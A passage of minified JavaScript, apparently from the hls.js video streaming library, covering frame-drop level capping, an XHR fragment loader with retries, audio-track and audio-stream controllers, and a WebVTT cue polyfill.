                            oe(t, e); var r = t.prototype; return r.destroy = function() { this.timer && clearInterval(this.timer), this.isVideoPlaybackQualityAvailable = !1 }, r.onMediaAttaching = function(e) { var t = this.hls.config; if (t.capLevelOnFPSDrop) { "function" == typeof(this.video = e.media instanceof window.HTMLVideoElement ? e.media : null).getVideoPlaybackQuality && (this.isVideoPlaybackQualityAvailable = !0), clearInterval(this.timer), this.timer = setInterval(this.checkFPSInterval.bind(this), t.fpsDroppedMonitoringPeriod) } }, r.checkFPS = function(e, t, r) { var i = vr.now(); if (t) { if (this.lastTime) { var n = i - this.lastTime,
                                            a = r - this.lastDroppedFrames,
                                            s = t - this.lastDecodedFrames,
                                            o = 1e3 * a / n,
                                            l = this.hls; if (l.trigger($e.default.FPS_DROP, { currentDropped: a, currentDecoded: s, totalDroppedFrames: r }), o > 0 && a > l.config.fpsDroppedMonitoringThreshold * s) { var u = l.currentLevel;
                                            et.logger.warn("drop FPS ratio greater than max allowed value for currentLevel: " + u), u > 0 && (-1 === l.autoLevelCapping || l.autoLevelCapping >= u) && (u -= 1, l.trigger($e.default.FPS_DROP_LEVEL_CAPPING, { level: u, droppedLevel: l.currentLevel }), l.autoLevelCapping = u, l.streamController.nextLevelSwitch()) } }
                                    this.lastTime = i, this.lastDroppedFrames = r, this.lastDecodedFrames = t } }, r.checkFPSInterval = function() { var e = this.video; if (e)
                                    if (this.isVideoPlaybackQualityAvailable) { var t = e.getVideoPlaybackQuality();
                                        this.checkFPS(e, t.totalVideoFrames, t.droppedVideoFrames) } else this.checkFPS(e, e.webkitDecodedFrameCount, e.webkitDroppedFrameCount) }, t }(it),
                        yr = mr,
                        br = function() {
                            function e(e) { e && e.xhrSetup && (this.xhrSetup = e.xhrSetup) } var t = e.prototype; return t.destroy = function() { this.abort(), this.loader = null }, t.abort = function() { var e = this.loader;
                                e && 4 !== e.readyState && (this.stats.aborted = !0, e.abort()), window.clearTimeout(this.requestTimeout), this.requestTimeout = null, window.clearTimeout(this.retryTimeout), this.retryTimeout = null }, t.load = function(e, t, r) { this.context = e, this.config = t, this.callbacks = r, this.stats = { trequest: window.performance.now(), retry: 0 }, this.retryDelay = t.retryDelay, this.loadInternal() }, t.loadInternal = function() { var e, t = this.context;
                                e = this.loader = new window.XMLHttpRequest; var r = this.stats;
                                r.tfirst = 0, r.loaded = 0; var i = this.xhrSetup; try { if (i) try { i(e, t.url) } catch (r) { e.open("GET", t.url, !0), i(e, t.url) }
                                    e.readyState || e.open("GET", t.url, !0) } catch (r) { return void this.callbacks.onError({ code: e.status, text: r.message }, t, e) }
                                t.rangeEnd && e.setRequestHeader("Range", "bytes=" + t.rangeStart + "-" + (t.rangeEnd - 1)), e.onreadystatechange = this.readystatechange.bind(this), e.onprogress = this.loadprogress.bind(this), e.responseType = t.responseType, this.requestTimeout = window.setTimeout(this.loadtimeout.bind(this), this.config.timeout), e.send() }, t.readystatechange = function(e) { var t = e.currentTarget,
                                    r = t.readyState,
                                    i = this.stats,
                                    n = this.context,
                                    a = this.config; if (!i.aborted && r >= 2)
                                    if (window.clearTimeout(this.requestTimeout), 0 === i.tfirst && (i.tfirst = Math.max(window.performance.now(), i.trequest)), 4 === r) { var s = t.status; if (s >= 200 && s < 300) { i.tload = Math.max(i.tfirst, window.performance.now()); var o, l; "arraybuffer" === n.responseType ? (o = t.response, l = o.byteLength) : (o = t.responseText, l = o.length), i.loaded = i.total = l; var u = { url: t.responseURL, data: o };
                                            this.callbacks.onSuccess(u, i, n, t) } else i.retry >= a.maxRetry || s >= 400 && s < 499 ? (et.logger.error(s + " while loading " + n.url), this.callbacks.onError({ code: s, text: t.statusText }, n, t)) : (et.logger.warn(s + " while loading " + n.url + ", retrying in " + this.retryDelay + "..."), this.destroy(), this.retryTimeout = window.setTimeout(this.loadInternal.bind(this), this.retryDelay), this.retryDelay = Math.min(2 * this.retryDelay, a.maxRetryDelay), i.retry++) } else this.requestTimeout = window.setTimeout(this.loadtimeout.bind(this), a.timeout) }, t.loadtimeout = function() { et.logger.warn("timeout while loading " + this.context.url), this.callbacks.onTimeout(this.stats, this.context, null) }, t.loadprogress = function(e) { var t = e.currentTarget,
                                    r = this.stats;
                                r.loaded = e.loaded, e.lengthComputable && (r.total = e.total); var i = this.callbacks.onProgress;
                                i && i(r, this.context, null, t) }, e }(),
                        _r = br,
                        Er = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MANIFEST_LOADING, $e.default.MANIFEST_PARSED, $e.default.AUDIO_TRACK_LOADED, $e.default.AUDIO_TRACK_SWITCHED, $e.default.LEVEL_LOADED, $e.default.ERROR) || this, r._trackId = -1, r._selectDefaultTrack = !0, r.tracks = [], r.trackIdBlacklist = Object.create(null), r.audioGroupId = null, r }
                            ce(t, e); var r = t.prototype; return r.onManifestLoading = function() { this.tracks = [], this._trackId = -1, this._selectDefaultTrack = !0 }, r.onManifestParsed = function(e) { var t = this.tracks = e.audioTracks || [];
                                this.hls.trigger($e.default.AUDIO_TRACKS_UPDATED, { audioTracks: t }), this._selectAudioGroup(this.hls.nextLoadLevel) }, r.onAudioTrackLoaded = function(e) { if (e.id >= this.tracks.length) return void et.logger.warn("Invalid audio track id:", e.id); if (et.logger.log("audioTrack " + e.id + " loaded"), this.tracks[e.id].details = e.details, e.details.live && !this.hasInterval()) { var t = 1e3 * e.details.targetduration;
                                    this.setInterval(t) }!e.details.live && this.hasInterval() && this.clearInterval() }, r.onAudioTrackSwitched = function(e) { var t = this.tracks[e.id].groupId;
                                t && this.audioGroupId !== t && (this.audioGroupId = t) }, r.onLevelLoaded = function(e) { this._selectAudioGroup(e.level) }, r.onError = function(e) { e.type === Qe.ErrorTypes.NETWORK_ERROR && (e.fatal && this.clearInterval(), e.details === Qe.ErrorDetails.AUDIO_TRACK_LOAD_ERROR && (et.logger.warn("Network failure on audio-track id:", e.context.id), this._handleLoadError())) }, r._setAudioTrack = function(e) { if (this._trackId === e && this.tracks[this._trackId].details) return void et.logger.debug("Same id as current audio-track passed, and track details available -> no-op"); if (e < 0 || e >= this.tracks.length) return void et.logger.warn("Invalid id passed to audio-track controller"); var t = this.tracks[e];
                                et.logger.log("Now switching to audio-track index " + e), this.clearInterval(), this._trackId = e; var r = t.url,
                                    i = t.type,
                                    n = t.id;
                                this.hls.trigger($e.default.AUDIO_TRACK_SWITCHING, { id: n, type: i, url: r }), this._loadTrackDetailsIfNeeded(t) }, r.doTick = function() { this._updateTrack(this._trackId) }, r._selectAudioGroup = function(e) { var t = this.hls.levels[e]; if (t && t.audioGroupIds) { var r = t.audioGroupIds[t.urlId];
                                    this.audioGroupId !== r && (this.audioGroupId = r, this._selectInitialAudioTrack()) } }, r._selectInitialAudioTrack = function() { var e = this,
                                    t = this.tracks; if (t.length) { var r = this.tracks[this._trackId],
                                        i = null; if (r && (i = r.name), this._selectDefaultTrack) { var n = t.filter(function(e) { return e.default });
                                        n.length ? t = n : et.logger.warn("No default audio tracks defined") } var a = !1,
                                        s = function() { t.forEach(function(t) { a || e.audioGroupId && t.groupId !== e.audioGroupId || i && i !== t.name || (e._setAudioTrack(t.id), a = !0) }) };
                                    s(), a || (i = null, s()), a || (et.logger.error("No track found for running audio group-ID: " + this.audioGroupId), this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.AUDIO_TRACK_LOAD_ERROR, fatal: !0 })) } }, r._needsTrackLoading = function(e) { var t = e.details,
                                    r = e.url; return !(t && !t.live) && !!r }, r._loadTrackDetailsIfNeeded = function(e) { if (this._needsTrackLoading(e)) { var t = e.url,
                                        r = e.id;
                                    et.logger.log("loading audio-track playlist for id: " + r), this.hls.trigger($e.default.AUDIO_TRACK_LOADING, { url: t, id: r }) } }, r._updateTrack = function(e) { if (!(e < 0 || e >= this.tracks.length)) { this.clearInterval(), this._trackId = e, et.logger.log("trying to update audio-track " + e); var t = this.tracks[e];
                                    this._loadTrackDetailsIfNeeded(t) } }, r._handleLoadError = function() { this.trackIdBlacklist[this._trackId] = !0; var e = this._trackId,
                                    t = this.tracks[e],
                                    r = t.name,
                                    i = t.language,
                                    n = t.groupId;
                                et.logger.warn("Loading failed on audio track id: " + e + ", group-id: " + n + ', name/language: "' + r + '" / "' + i + '"'); for (var a = e, s = 0; s < this.tracks.length; s++)
                                    if (!this.trackIdBlacklist[s]) { var o = this.tracks[s]; if (o.name === r) { a = s; break } }
                                if (a === e) return void et.logger.warn('No fallback audio-track found for name/language: "' + r + '" / "' + i + '"');
                                et.logger.log("Attempting audio-track fallback id:", a, "group-id:", this.tracks[a].groupId), this._setAudioTrack(a) }, ue(t, [{ key: "audioTracks", get: function() { return this.tracks } }, { key: "audioTrack", get: function() { return this._trackId }, set: function(e) { this._setAudioTrack(e), this._selectDefaultTrack = !1 } }]), t }(zt),
                        Sr = Er,
                        Tr = window,
                        wr = Tr.performance,
                        Ar = function(e) {
                            function t(t, r) { var i; return i = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHING, $e.default.AUDIO_TRACKS_UPDATED, $e.default.AUDIO_TRACK_SWITCHING, $e.default.AUDIO_TRACK_LOADED, $e.default.KEY_LOADED, $e.default.FRAG_LOADED, $e.default.FRAG_PARSING_INIT_SEGMENT, $e.default.FRAG_PARSING_DATA, $e.default.FRAG_PARSED, $e.default.ERROR, $e.default.BUFFER_RESET, $e.default.BUFFER_CREATED, $e.default.BUFFER_APPENDED, $e.default.BUFFER_FLUSHED, $e.default.INIT_PTS_FOUND) || this, i.fragmentTracker = r, i.config = t.config, i.audioCodecSwap = !1, i._state = Yt.STOPPED, i.initPTS = [], i.waitingFragment = null, i.videoTrackCC = null, i.waitingVideoCC = null, i }
                            he(t, e); var r = t.prototype; return r.onInitPtsFound = function(e) { var t = e.id,
                                    r = e.frag.cc,
                                    i = e.initPTS; "main" === t && (this.initPTS[r] = i, this.videoTrackCC = r, et.logger.log("InitPTS for cc: " + r + " found from main: " + i), this.state === Yt.WAITING_INIT_PTS && this.tick()) }, r.startLoad = function(e) { if (this.tracks) { var t = this.lastCurrentTime;
                                    this.stopLoad(), this.setInterval(100), this.fragLoadError = 0, t > 0 && -1 === e ? (et.logger.log("audio:override startPosition with lastCurrentTime @" + t.toFixed(3)), this.state = Yt.IDLE) : (this.lastCurrentTime = this.startPosition ? this.startPosition : e, this.state = Yt.STARTING), this.nextLoadPosition = this.startPosition = this.lastCurrentTime, this.tick() } else this.startPosition = e, this.state = Yt.STOPPED }, r.doTick = function() { var e, t, r, i = this.hls,
                                    n = i.config; switch (this.state) {
                                    case Yt.ERROR:
                                    case Yt.PAUSED:
                                    case Yt.BUFFER_FLUSHING:
                                        break;
                                    case Yt.STARTING:
                                        this.state = Yt.WAITING_TRACK, this.loadedmetadata = !1; break;
                                    case Yt.IDLE:
                                        var a = this.tracks; if (!a) break; if (!this.media && (this.startFragRequested || !n.startFragPrefetch)) break; if (this.loadedmetadata) e = this.media.currentTime;
                                        else if (void 0 === (e = this.nextLoadPosition)) break; var s = this.mediaBuffer ? this.mediaBuffer : this.media,
                                            o = this.videoBuffer ? this.videoBuffer : this.media,
                                            l = e < n.maxBufferHole ? Math.max(2, n.maxBufferHole) : n.maxBufferHole,
                                            u = Mt.bufferInfo(s, e, l),
                                            c = Mt.bufferInfo(o, e, l),
                                            d = u.len,
                                            f = u.end,
                                            h = this.fragPrevious,
                                            g = Math.min(n.maxBufferLength, n.maxMaxBufferLength),
                                            p = Math.max(g, c.len),
                                            v = this.audioSwitch,
                                            m = this.trackId; if ((d < p || v) && m < a.length) { if (void 0 === (r = a[m].details)) { this.state = Yt.WAITING_TRACK; break } if (!v && this._streamEnded(u, r)) return this.hls.trigger($e.default.BUFFER_EOS, { type: "audio" }), void(this.state = Yt.ENDED); var y, b = r.fragments,
                                                _ = b.length,
                                                E = b[0].start,
                                                S = b[_ - 1].start + b[_ - 1].duration; if (v)
                                                if (r.live && !r.PTSKnown) et.logger.log("switching audiotrack, live stream, unknown PTS,load first fragment"), f = 0;
                                                else if (f = e, r.PTSKnown && e < E) { if (!(u.end > E || u.nextStart)) return;
                                                et.logger.log("alt audio track ahead of main track, seek to start of alt audio track"), this.media.currentTime = E + .05 } if (r.initSegment && !r.initSegment.data) y = r.initSegment;
                                            else if (f <= E) { if (y = b[0], null !== this.videoTrackCC && y.cc !== this.videoTrackCC && (y = k(b, this.videoTrackCC)), r.live && y.loadIdx && y.loadIdx === this.fragLoadIdx) { var T = u.nextStart ? u.nextStart : E; return et.logger.log("no alt audio available @currentTime:" + this.media.currentTime + ", seeking @" + (T + .05)), void(this.media.currentTime = T + .05) } } else { var w, A = n.maxFragLookUpTolerance,
                                                    R = h ? b[h.sn - b[0].sn + 1] : void 0;
                                                f < S ? (f > S - A && (A = 0), w = R && !F(f, A, R) ? R : Ot.search(b, function(e) { return F(f, A, e) })) : w = b[_ - 1], w && (y = w, E = w.start, h && y.level === h.level && y.sn === h.sn && (y.sn < r.endSN ? (y = b[y.sn + 1 - r.startSN], this.fragmentTracker.getState(y) !== Lt.OK && et.logger.log("SN just loaded, load next one: " + y.sn)) : y = null)) }
                                            y && (y.encrypted ? (et.logger.log("Loading key for " + y.sn + " of [" + r.startSN + " ," + r.endSN + "],track " + m), this.state = Yt.KEY_LOADING, i.trigger($e.default.KEY_LOADING, { frag: y })) : (this.fragCurrent = y, (v || this.fragmentTracker.getState(y) === Lt.NOT_LOADED) && (et.logger.log("Loading " + y.sn + ", cc: " + y.cc + " of [" + r.startSN + " ," + r.endSN + "],track " + m + ", " + (this.loadedmetadata ? "currentTime" : "nextLoadPosition") + ": " + e + ", bufferEnd: " + f.toFixed(3)), "initSegment" !== y.sn && (this.startFragRequested = !0), Object(Ze.isFiniteNumber)(y.sn) && (this.nextLoadPosition = y.start + y.duration), i.trigger($e.default.FRAG_LOADING, { frag: y }), this.state = Yt.FRAG_LOADING))) } break;
                                    case Yt.WAITING_TRACK:
                                        t = this.tracks[this.trackId], t && t.details && (this.state = Yt.IDLE); break;
                                    case Yt.FRAG_LOADING_WAITING_RETRY:
                                        var P = wr.now(),
                                            D = this.retryDate;
                                        s = this.media; var L = s && s.seeking;
                                        (!D || P >= D || L) && (et.logger.log("audioStreamController: retryDate reached, switch back to IDLE state"), this.state = Yt.IDLE); break;
                                    case Yt.WAITING_INIT_PTS:
                                        var C = this.waitingFragment; if (C) { var I = C.frag.cc; if (void 0 !== this.initPTS[I]) this.waitingFragment = null, this.state = Yt.FRAG_LOADING, this.onFragLoaded(C);
                                            else if (this.videoTrackCC !== this.waitingVideoCC) et.logger.log("Waiting fragment cc (" + I + ") cancelled because video is at cc " + this.videoTrackCC), this.clearWaitingFragment();
                                            else { var O = Mt.bufferInfo(this.mediaBuffer, this.media.currentTime, n.maxBufferHole),
                                                    M = F(O.end, n.maxFragLookUpTolerance, C.frag);
                                                M < 0 && (et.logger.log("Waiting fragment cc (" + I + ") @ " + C.frag.start + " cancelled because another fragment at " + O.end + " is needed"), this.clearWaitingFragment()) } } else this.state = Yt.IDLE; break;
                                    case Yt.STOPPED:
                                    case Yt.FRAG_LOADING:
                                    case Yt.PARSING:
                                    case Yt.PARSED:
                                    case Yt.ENDED:
                                } }, r.clearWaitingFragment = function() { var e = this.waitingFragment;
                                e && (this.fragmentTracker.removeFragment(e.frag), this.waitingFragment = null, this.waitingVideoCC = null, this.state = Yt.IDLE) }, r.onMediaAttached = function(e) { var t = this.media = this.mediaBuffer = e.media;
                                this.onvseeking = this.onMediaSeeking.bind(this), this.onvended = this.onMediaEnded.bind(this), t.addEventListener("seeking", this.onvseeking), t.addEventListener("ended", this.onvended); var r = this.config;
                                this.tracks && r.autoStartLoad && this.startLoad(r.startPosition) }, r.onMediaDetaching = function() { var e = this.media;
                                e && e.ended && (et.logger.log("MSE detaching and video ended, reset startPosition"), this.startPosition = this.lastCurrentTime = 0), e && (e.removeEventListener("seeking", this.onvseeking), e.removeEventListener("ended", this.onvended), this.onvseeking = this.onvseeked = this.onvended = null), this.media = this.mediaBuffer = this.videoBuffer = null, this.loadedmetadata = !1, this.fragmentTracker.removeAllFragments(), this.stopLoad() }, r.onAudioTracksUpdated = function(e) { et.logger.log("audio tracks updated"), this.tracks = e.audioTracks }, r.onAudioTrackSwitching = function(e) { var t = !!e.url;
                                this.trackId = e.id, this.fragCurrent = null, this.clearWaitingFragment(), this.state = Yt.PAUSED, t ? this.setInterval(100) : this.demuxer && (this.demuxer.destroy(), this.demuxer = null), t && (this.audioSwitch = !0, this.state = Yt.IDLE), this.tick() }, r.onAudioTrackLoaded = function(e) { var t = e.details,
                                    r = e.id,
                                    i = this.tracks[r],
                                    n = i.details,
                                    a = t.totalduration,
                                    s = 0; if (et.logger.log("track " + r + " loaded [" + t.startSN + "," + t.endSN + "],duration:" + a), t.live || n && n.live ? n && t.fragments.length > 0 ? (S(n, t), s = t.fragments[0].start, t.PTSKnown ? et.logger.log("live audio playlist sliding:" + s.toFixed(3)) : et.logger.log("live audio playlist - outdated PTS, unknown sliding")) : (t.PTSKnown = !1, et.logger.log("live audio playlist - first load, unknown sliding")) : t.PTSKnown = !1, i.details = t, !this.startFragRequested) { if (-1 === this.startPosition) { var o = t.startTimeOffset;
                                        Object(Ze.isFiniteNumber)(o) ? (et.logger.log("start time offset found in playlist, adjust startPosition to " + o), this.startPosition = o) : t.live ? (this.startPosition = this.computeLivePosition(s, t), et.logger.log("compute startPosition for audio-track to " + this.startPosition)) : this.startPosition = 0 }
                                    this.nextLoadPosition = this.startPosition }
                                this.state === Yt.WAITING_TRACK && (this.state = Yt.IDLE), this.tick() }, r.onKeyLoaded = function() { this.state === Yt.KEY_LOADING && (this.state = Yt.IDLE, this.tick()) }, r.onFragLoaded = function(e) { var t = this.fragCurrent,
                                    r = e.frag; if (this.state === Yt.FRAG_LOADING && t && "audio" === r.type && r.level === t.level && r.sn === t.sn) { var i = this.tracks[this.trackId],
                                        n = i.details,
                                        a = n.totalduration,
                                        s = t.level,
                                        o = t.sn,
                                        l = t.cc,
                                        u = this.config.defaultAudioCodec || i.audioCodec || "mp4a.40.2",
                                        c = this.stats = e.stats; if ("initSegment" === o) this.state = Yt.IDLE, c.tparsed = c.tbuffered = wr.now(), n.initSegment.data = e.payload, this.hls.trigger($e.default.FRAG_BUFFERED, { stats: c, frag: t, id: "audio" }), this.tick();
                                    else { this.state = Yt.PARSING, this.appended = !1, this.demuxer || (this.demuxer = new qt(this.hls, "audio")); var d = this.initPTS[l],
                                            f = n.initSegment ? n.initSegment.data : []; if (void 0 !== d) { this.pendingBuffering = !0, et.logger.log("Demuxing " + o + " of [" + n.startSN + " ," + n.endSN + "],track " + s);
                                            this.demuxer.push(e.payload, f, u, null, t, a, !1, d) } else et.logger.log("Unknown video PTS for cc " + l + ", waiting for video PTS before demuxing audio frag " + o + " of [" + n.startSN + " ," + n.endSN + "],track " + s), this.waitingFragment = e, this.waitingVideoCC = this.videoTrackCC, this.state = Yt.WAITING_INIT_PTS } }
                                this.fragLoadError = 0 }, r.onFragParsingInitSegment = function(e) { var t = this.fragCurrent,
                                    r = e.frag; if (t && "audio" === e.id && r.sn === t.sn && r.level === t.level && this.state === Yt.PARSING) { var i, n = e.tracks; if (n.video && delete n.video, i = n.audio) { i.levelCodec = i.codec, i.id = e.id, this.hls.trigger($e.default.BUFFER_CODECS, n), et.logger.log("audio track:audio,container:" + i.container + ",codecs[level/parsed]=[" + i.levelCodec + "/" + i.codec + "]"); var a = i.initSegment; if (a) { var s = { type: "audio", data: a, parent: "audio", content: "initSegment" };
                                            this.audioSwitch ? this.pendingData = [s] : (this.appended = !0, this.pendingBuffering = !0, this.hls.trigger($e.default.BUFFER_APPENDING, s)) }
                                        this.tick() } } }, r.onFragParsingData = function(e) { var t = this,
                                    r = this.fragCurrent,
                                    i = e.frag; if (r && "audio" === e.id && "audio" === e.type && i.sn === r.sn && i.level === r.level && this.state === Yt.PARSING) { var n = this.trackId,
                                        a = this.tracks[n],
                                        s = this.hls;
                                    Object(Ze.isFiniteNumber)(e.endPTS) || (e.endPTS = e.startPTS + r.duration, e.endDTS = e.startDTS + r.duration), r.addElementaryStream(at.AUDIO), et.logger.log("parsed " + e.type + ",PTS:[" + e.startPTS.toFixed(3) + "," + e.endPTS.toFixed(3) + "],DTS:[" + e.startDTS.toFixed(3) + "/" + e.endDTS.toFixed(3) + "],nb:" + e.nb), E(a.details, r, e.startPTS, e.endPTS); var o = this.media,
                                        l = !1; if (this.audioSwitch)
                                        if (o && o.readyState) { var u = o.currentTime;
                                            et.logger.log("switching audio track : currentTime:" + u), u >= e.startPTS && (et.logger.log("switching audio track : flushing all audio"), this.state = Yt.BUFFER_FLUSHING, s.trigger($e.default.BUFFER_FLUSHING, { startOffset: 0, endOffset: Number.POSITIVE_INFINITY, type: "audio" }), l = !0, this.audioSwitch = !1, s.trigger($e.default.AUDIO_TRACK_SWITCHED, { id: n })) } else this.audioSwitch = !1, s.trigger($e.default.AUDIO_TRACK_SWITCHED, { id: n });
                                    var c = this.pendingData; if (!c) return et.logger.warn("Apparently attempt to enqueue media payload without codec initialization data upfront"), void s.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: null, fatal: !0 });
                                    this.audioSwitch || ([e.data1, e.data2].forEach(function(t) { t && t.length && c.push({ type: e.type, data: t, parent: "audio", content: "data" }) }), !l && c.length && (c.forEach(function(e) { t.state === Yt.PARSING && (t.pendingBuffering = !0, t.hls.trigger($e.default.BUFFER_APPENDING, e)) }), this.pendingData = [], this.appended = !0)), this.tick() } }, r.onFragParsed = function(e) { var t = this.fragCurrent,
                                    r = e.frag;
                                t && "audio" === e.id && r.sn === t.sn && r.level === t.level && this.state === Yt.PARSING && (this.stats.tparsed = wr.now(), this.state = Yt.PARSED, this._checkAppendedParsed()) }, r.onBufferReset = function() { this.mediaBuffer = this.videoBuffer = null, this.loadedmetadata = !1 }, r.onBufferCreated = function(e) { var t = e.tracks.audio;
                                t && (this.mediaBuffer = t.buffer, this.loadedmetadata = !0), e.tracks.video && (this.videoBuffer = e.tracks.video.buffer) }, r.onBufferAppended = function(e) { if ("audio" === e.parent) { var t = this.state;
                                    t !== Yt.PARSING && t !== Yt.PARSED || (this.pendingBuffering = e.pending > 0, this._checkAppendedParsed()) } }, r._checkAppendedParsed = function() { if (!(this.state !== Yt.PARSED || this.appended && this.pendingBuffering)) { var e = this.fragCurrent,
                                        t = this.stats,
                                        r = this.hls; if (e) { this.fragPrevious = e, t.tbuffered = wr.now(), r.trigger($e.default.FRAG_BUFFERED, { stats: t, frag: e, id: "audio" }); var i = this.mediaBuffer ? this.mediaBuffer : this.media;
                                        i && et.logger.log("audio buffered : " + Vt.toString(i.buffered)), this.audioSwitch && this.appended && (this.audioSwitch = !1, r.trigger($e.default.AUDIO_TRACK_SWITCHED, { id: this.trackId })), this.state = Yt.IDLE }
                                    this.tick() } }, r.onError = function(e) { var t = e.frag; if (!t || "audio" === t.type) switch (e.details) {
                                    case Qe.ErrorDetails.FRAG_LOAD_ERROR:
                                    case Qe.ErrorDetails.FRAG_LOAD_TIMEOUT:
                                        var r = e.frag; if (r && "audio" !== r.type) break; if (!e.fatal) { var i = this.fragLoadError;
                                            i ? i++ : i = 1; var n = this.config; if (i <= n.fragLoadingMaxRetry) { this.fragLoadError = i; var a = Math.min(Math.pow(2, i - 1) * n.fragLoadingRetryDelay, n.fragLoadingMaxRetryTimeout);
                                                et.logger.warn("AudioStreamController: frag loading failed, retry in " + a + " ms"), this.retryDate = wr.now() + a, this.state = Yt.FRAG_LOADING_WAITING_RETRY } else et.logger.error("AudioStreamController: " + e.details + " reaches max retry, redispatch as fatal ..."), e.fatal = !0, this.state = Yt.ERROR } break;
                                    case Qe.ErrorDetails.AUDIO_TRACK_LOAD_ERROR:
                                    case Qe.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT:
                                    case Qe.ErrorDetails.KEY_LOAD_ERROR:
                                    case Qe.ErrorDetails.KEY_LOAD_TIMEOUT:
                                        this.state !== Yt.ERROR && (this.state = e.fatal ? Yt.ERROR : Yt.IDLE, et.logger.warn("AudioStreamController: " + e.details + " while loading frag, now switching to " + this.state + " state ...")); break;
                                    case Qe.ErrorDetails.BUFFER_FULL_ERROR:
                                        if ("audio" === e.parent && (this.state === Yt.PARSING || this.state === Yt.PARSED)) { var s = this.mediaBuffer,
                                                o = this.media.currentTime; if (s && Mt.isBuffered(s, o) && Mt.isBuffered(s, o + .5)) { var l = this.config;
                                                l.maxMaxBufferLength >= l.maxBufferLength && (l.maxMaxBufferLength /= 2, et.logger.warn("AudioStreamController: reduce max buffer length to " + l.maxMaxBufferLength + "s")), this.state = Yt.IDLE } else et.logger.warn("AudioStreamController: buffer full error also media.currentTime is not buffered, flush audio buffer"), this.fragCurrent = null, this.state = Yt.BUFFER_FLUSHING, this.hls.trigger($e.default.BUFFER_FLUSHING, { startOffset: 0, endOffset: Number.POSITIVE_INFINITY, type: "audio" }) } } }, r.onBufferFlushed = function() { var e = this,
                                    t = this.pendingData;
                                t && t.length ? (et.logger.log("AudioStreamController: appending pending audio data after buffer flushed"), t.forEach(function(t) { e.hls.trigger($e.default.BUFFER_APPENDING, t) }), this.appended = !0, this.pendingData = [], this.state = Yt.PARSED) : (this.state = Yt.IDLE, this.fragPrevious = null, this.tick()) }, fe(t, [{ key: "state", set: function(e) { if (this.state !== e) { var t = this.state;
                                        this._state = e, et.logger.log("audio stream:" + t + "->" + e) } }, get: function() { return this._state } }]), t }(Xt),
                        Rr = Ar,
                        Pr = function() {
                            function e(e) { return "string" == typeof e && (!!a[e.toLowerCase()] && e.toLowerCase()) }

                            function t(e) { return "string" == typeof e && (!!s[e.toLowerCase()] && e.toLowerCase()) }

                            function r(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) e[i] = r[i] } return e }

                            function i(i, a, s) { var o = this,
                                    l = {};
                                l.enumerable = !0, o.hasBeenReset = !1; var u = "",
                                    c = !1,
                                    d = i,
                                    f = a,
                                    h = s,
                                    g = null,
                                    p = "",
                                    v = !0,
                                    m = "auto",
                                    y = "start",
                                    b = 50,
                                    _ = "middle",
                                    E = 50,
                                    S = "middle";
                                Object.defineProperty(o, "id", r({}, l, { get: function() { return u }, set: function(e) { u = "" + e } })), Object.defineProperty(o, "pauseOnExit", r({}, l, { get: function() { return c }, set: function(e) { c = !!e } })), Object.defineProperty(o, "startTime", r({}, l, { get: function() { return d }, set: function(e) { if ("number" != typeof e) throw new TypeError("Start time must be set to a number.");
                                        d = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "endTime", r({}, l, { get: function() { return f }, set: function(e) { if ("number" != typeof e) throw new TypeError("End time must be set to a number.");
                                        f = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "text", r({}, l, { get: function() { return h }, set: function(e) { h = "" + e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "region", r({}, l, { get: function() { return g }, set: function(e) { g = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "vertical", r({}, l, { get: function() { return p }, set: function(t) { var r = e(t); if (!1 === r) throw new SyntaxError("An invalid or illegal string was specified.");
                                        p = r, this.hasBeenReset = !0 } })), Object.defineProperty(o, "snapToLines", r({}, l, { get: function() { return v }, set: function(e) { v = !!e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "line", r({}, l, { get: function() { return m }, set: function(e) { if ("number" != typeof e && e !== n) throw new SyntaxError("An invalid number or illegal string was specified.");
                                        m = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "lineAlign", r({}, l, { get: function() { return y }, set: function(e) { var r = t(e); if (!r) throw new SyntaxError("An invalid or illegal string was specified.");
                                        y = r, this.hasBeenReset = !0 } })), Object.defineProperty(o, "position", r({}, l, { get: function() { return b }, set: function(e) { if (e < 0 || e > 100) throw new Error("Position must be between 0 and 100.");
                                        b = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "positionAlign", r({}, l, { get: function() { return _ }, set: function(e) { var r = t(e); if (!r) throw new SyntaxError("An invalid or illegal string was specified.");
                                        _ = r, this.hasBeenReset = !0 } })), Object.defineProperty(o, "size", r({}, l, { get: function() { return E }, set: function(e) { if (e < 0 || e > 100) throw new Error("Size must be between 0 and 100.");
                                        E = e, this.hasBeenReset = !0 } })), Object.defineProperty(o, "align", r({}, l, { get: function() { return S }, set: function(e) { var r = t(e); if (!r) throw new SyntaxError("An invalid or illegal string was specified.");
                                        S = r, this.hasBeenReset = !0 } })), o.displayState = void 0 } if ("undefined" != typeof window && window.VTTCue) return window.VTTCue; var n = "auto",
                                a = { "": !0, lr: !0, rl: !0 },
                                s = { start: !0, middle: !0, end: !0, left: !0, right: !0 }; return i.prototype.getCueAsHTML = function() { return window.WebVTT.convertCueToDOMTree(window, this.text) }, i }(),
                        kr = function() { return { decode: function(e) { if (!e) return ""; if ("string" != typeof e) throw new Error("Error - expected string data."); return decodeURIComponent(encodeURIComponent(e)) } } };
                    ve.prototype = { set: function(e, t) { this.get(e) || "" === t || (this.values[e] = t) }, get: function(e, t, r) { return r ? this.has(e) ? this.values[e] : t[r] : this.has(e) ? this.values[e] : t }, has: function(e) { return e in this.values }, alt: function(e, t, r) { for (var i = 0; i < r.length; ++i)
                                if (t === r[i]) { this.set(e, t); break } }, integer: function(e, t) { /^-?\d+$/.test(t) && this.set(e, parseInt(t, 10)) }, percent: function(e, t) { return !!(t.match(/^([\d]{1,3})(\.[\d]*)?%$/) && (t = parseFloat(t)) >= 0 && t <= 100) && (this.set(e, t), !0) } }; var Dr = new Pr(0, 0, 0),
                        Lr = "middle" === Dr.align ? "middle" : "center";
                    ge.prototype = { parse: function(e) {
                            function t() { var e = r.buffer,
